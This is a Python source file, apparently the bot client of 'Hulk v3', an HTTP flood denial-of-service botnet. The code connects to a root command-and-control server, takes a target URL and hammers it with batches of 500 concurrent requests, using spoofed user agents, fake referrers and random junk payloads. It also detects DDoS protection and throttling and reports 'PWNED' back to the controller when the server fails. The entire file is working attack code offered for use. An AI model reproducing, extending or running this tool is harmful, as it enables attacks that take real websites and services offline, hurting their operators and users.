#!/usr/bin/env python3

"""
Hulk v3

The main module of the Hulk v3 which launches the HTTP missiles.
Each process represents a single bot in the botnet.
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import logging
import platform
import random
import re
import socket
import string
import sys
import threading
from typing import TYPE_CHECKING, List, Optional, Tuple
from urllib.parse import urljoin

import aiohttp

try:  # When running directly.
    from enums import ClientCommands, ServerCommands, StatusCodes
except ImportError:  # When imported into launcher.
    from client.enums import ClientCommands, ServerCommands, StatusCodes

if TYPE_CHECKING:
    from asyncio import Task


class CustomFilter(logging.Filter):
    """
    Custom filter to add IP and Port to Logs.
    """

    def __init__(self) -> None:
        super().__init__()
        self._ip = threading.get_native_id()
        self._port = -1

    def update_address(self, address: Tuple[str, int]):
        """
        Update the IP and Port.

        :param address: The IP and Port.
        :type address: Tuple[str, int]
        """
        self._ip, self._port = address

    def filter(self, record: logging.LogRecord):
        """
        Filter the log record.

        :param record: The log record to filter.
        :type record: logging.LogRecord
        :return: Whether the record should be filtered.
        :rtype: bool
        """
        record.ip = self._ip
        record.port = self._port
        return True


LOGGER = logging.getLogger("Hulk_Client")
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(
    logging.Formatter(
        fmt="[%(ip)s:%(port)d] %(message)s",
    )
)
LOGGER.addHandler(handler)
LOGGER.setLevel(logging.INFO)
FILTER = CustomFilter()
LOGGER.addFilter(FILTER)


class Missile:
    """
    The Missile class which will hammer the target with HTTP requests.

    :param com: The Comms class which is used to communicate with the server.
    :type com: :class:`Comms`
    :param target: The target URL to attack.
    :type target: str
    """
    def __init__(self, com: Comms, target: str):
        self.comms = com
        self.url = target
        self.host = urljoin(self.url, '/')
        self.method = "post"
        self.count = 0

    @staticmethod
    def generate_junk(size: int) -> str:
        """
        Generate random junk data.

        :param size: The size of the junk data.
        :type size: int
        :return: The random junk data.
        :rtype: str
        """
        return ''.join(
            random.choices(
                string.ascii_letters + string.digits,
                k=random.randint(3, size)
            )
        )

    async def _launch(self, session: aiohttp.ClientSession) -> int:
        """
        Launch a single HTTP request and return the response.

        :param session: The session to use for the request.
        :type session: :class:`aiohttp.ClientSession`
        :return: The response status code.
        :rtype: int
        """
        self.count += 1
        FILTER.update_address(self.comms.address)
        LOGGER.info(
            "Launching attack no. %d on %s",
            self.count, self.url.split('?')[0]
        )
        headers, payload = self._get_payload()
        try:
            async with session.request(
                method=self.method,
                url=self.url,
                headers=headers,
                json=payload
            ) as resp:
                status = resp.status
                reason = resp.reason
                if any([
                    resp.headers.get('server', '').lower() == "cloudflare",
                    status == 400
                ]):
                    FILTER.update_address(self.comms.address)
                    LOGGER.error('\nUrl has DDoS protection.')
                    self.comms.send(StatusCodes.ANTI_DDOS)
                elif status == 403:
                    FILTER.update_address(self.comms.address)
                    LOGGER.error(
                        '\nUrl is protected. Please retry with another url.'
                    )
                    self.comms.send(StatusCodes.FORBIDDEN)
                elif status == 404:
                    FILTER.update_address(self.comms.address)
                    LOGGER.error(
                        '\nUrl not found. Please retry with another url.'
                    )
                elif status == 405:
                    self.method = "get"
                elif status == 429:
                    FILTER.update_address(self.comms.address)
                    LOGGER.warning(
                        '\nToo many requests detected. Slowing down a bit.'
                    )
                    await asyncio.sleep(random.uniform(5.0, 7.5))
                elif status >= 500:
                    FILTER.update_address(self.comms.address)
                    LOGGER.info("Successfully DoSed %s!", self.url)
                    self.comms.send(StatusCodes.PWNED)
                elif status >= 400:
                    FILTER.update_address(self.comms.address)
                    LOGGER.warning(
                        "\nUnknown status code detected.\n%d\n%s",
                        status, reason
                    )
            return status
        except aiohttp.ClientConnectorError:
            return 69

    def _get_payload(self) -> Tuple[dict, dict]:
        """
        Generate the payload for the HTTP request.

        :return: The headers and payload for the HTTP request.
        :rtype: Tuple[dict, dict]
        """
        ua_list = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
            'Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
            'Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
            'AppleWebKit/532.1 (KHTML, like Gecko)'
            'Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
            'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
            'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
            '.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
            'Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
            'SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]
        referrer_list = [
            'https://www.google.com/?q=',
            'https://www.usatoday.com/search/results?q=',
            'https://engadget.search.aol.com/search?q=',
            'https://cloudfare.com',
            'https://github.com',
            'https://en.wikipedia.org',
            'https://youtu.be',
            'https://mozilla.org',
            'https://microsoft.com',
            'https://wordpress.org',
            self.host
        ]
        headers = {
            'Cache-Control': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;'
            'q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Content-Encoding': 'deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Keep-Alive': str(random.randint(110, 120)),
            'User-Agent': random.choice(ua_list),
            'Referer': random.choice(referrer_list),
        }
        payload = {
            self.generate_junk(
                random.randint(5, 10)
            ): self.generate_junk(
                random.randint(500, 1000)
            )
        }
        return headers, payload

    async def attack(self, count: int):
        """
        Launch the attack.

        :param count: The number of requests to launch.
        :type count: int
        """
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=0),
        ) as session:
            tasks = [
                asyncio.create_task(self._launch(session))
                for _ in range(count)
            ]
            status_list = set(await asyncio.gather(*tasks))
        if all(
            status < 500 and status not in (403, 404, 69)
            for status in status_list
        ):
            FILTER.update_address(self.comms.address)
            LOGGER.info(
                "Finished Performing %d attacks "
                "but the target is still intact...",
                self.count
            )
        with contextlib.suppress(ConnectionError):
            root_server = self.comms.root_server
            root_server.sendall(
                f"<{ClientCommands.READ_STATUS}>".encode()
            )
            root_server.sendall(
                b', '.join(
                    f"<{status}>".encode()
                    for status in status_list
                )
            )


class Comms:
    """
    The class which communicates with the root server.

    :param root_ip: The root server's address.
    :type root_ip: str
    :param root_port: The root server's port.
    :type root_port: Optional[int]
    """
    def __init__(
        self, root_ip: str,
        root_port: Optional[int] = 6666
    ):
        self.root_ip = root_ip
        self.root_port = root_port
        self._root_server = None
        self._tasks: List[Task] = []

    @property
    def root_server(self):
        """
        Get the root server socket from given IP and Port.

        :param root_ip: IP of the root server.
        :type root_ip: str
        :param root_port: Port of the root server.
        :type root_port: Optional[int]
        :return: The root server socket.
        :rtype: socket.socket
        """
        if self._root_server is not None:
            return self._root_server
        root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        LOGGER.info("Trying to establish connection with Root server.")
        while True:
            try:
                with contextlib.suppress(ConnectionError):
                    root.connect((self.root_ip, self.root_port))
                    break
            except KeyboardInterrupt:
                sys.exit(0)
        self._root_server = root
        FILTER.update_address(self.address)
        LOGGER.info(
            "Connected to root @ [%s:%d]!",
            self.root_ip, self.root_port
        )
        root.sendall(f"<{ClientCommands.SEND_TARGET}>".encode())
        return root

    @property
    def address(self):
        """
        Get the address of the client.

        :return: The address of the client.
        :rtype: str
        """
        if self._root_server is None:
            return (threading.get_native_id(), -1)
        return self._root_server.getsockname()

    def close_server(self):
        """
        Close the root server socket.
        """
        if self._root_server is not None:
            self._root_server.close()
            self._root_server = None

    async def monitor(self):
        """
        Monitor the root server for commands.
        """
        root = self.root_server
        while True:
            try:
                command = root.recv(1024)  # message
                message = command.decode()
                if message == str(ServerCommands.TERMINATE):
                    for task in self._tasks:
                        task.cancel()
                    root.sendall(f"<{ClientCommands.KILLED}>".encode())
                    root.close()
                    sys.exit(0)
                elif message == str(ServerCommands.STOP):
                    for task in self._tasks:
                        task.cancel()
                    FILTER.update_address(self.address)
                    LOGGER.warning(
                        "Stopped by the root server.\n"
                        "Switching to Stand By mode."
                    )
                    root.sendall(f"<{ClientCommands.STANDBY}>".encode())
                elif message == str(ServerCommands.READ_TARGET):
                    target = root.recv(1024).decode()  # Target
                    missile = Missile(self, target)
                    task = asyncio.create_task(
                        missile.attack(500)
                    )
                    self._tasks.append(task)
                    await task
            except ConnectionResetError:
                FILTER.update_address(self.address)
                LOGGER.warning(
                    "Connection with the root server was reset.\n"
                    "Switching to Stand By mode."
                )
                self._root_server = None
                root = self.root_server
            except KeyboardInterrupt:
                for task in self._tasks:
                    task.cancel()
                root.sendall(f"<{ClientCommands.KILLED}>".encode())
                root.close()
                sys.exit(0)

    def send(self, status_code: StatusCodes):
        """
        Send a status code to the root server.

        :param status_code: The status code to send.
        :type status_code: StatusCodes
        """
        with contextlib.suppress(ConnectionError):
            for msg in [ClientCommands.READ_STATUS, status_code]:
                self._root_server.sendall(f"<{msg}>".encode())


def modify_parser(parser: argparse.ArgumentParser):
    """
    Useful for exposing the parser modification to external modules.

    :param parser: The parser to modify.
    :type parser: argparse.ArgumentParser
    """
    def ip_address(arg: argparse.Action):
        """
        Validate the IP address.

        :param arg: The argument to validate.
        :type arg: argparse.Action
        :return: The validated argument.
        :rtype: argparse.Action
        """
        ip_pattern = re.compile(
            r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
            r"|^localhost$"
        )
        if not ip_pattern.match(arg):
            raise argparse.ArgumentTypeError(
                f"{arg} is not a valid IP address."
            )
        return arg
    parser.add_argument(
        '-r', '--root_ip',
        help='IPv4 Address where Hulk Server is running.',
        default="localhost",
        type=ip_address
    )
    parser.add_argument(
        '-p', '--root_port',
        help='Port where Hulk Server is running.',
        default=6666
    )
    parser.add_argument(
        '-s', '--stealth',
        help='Stealth mode.',
        action='store_true',
    )


if __name__ == "__main__":
    argparser = argparse.ArgumentParser()
    modify_parser(argparser)
    args = argparser.parse_args()

    comms = Comms(args.root_ip, args.root_port)

    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(
            asyncio.WindowsSelectorEventLoopPolicy()
        )
    asyncio.run(comms.monitor())
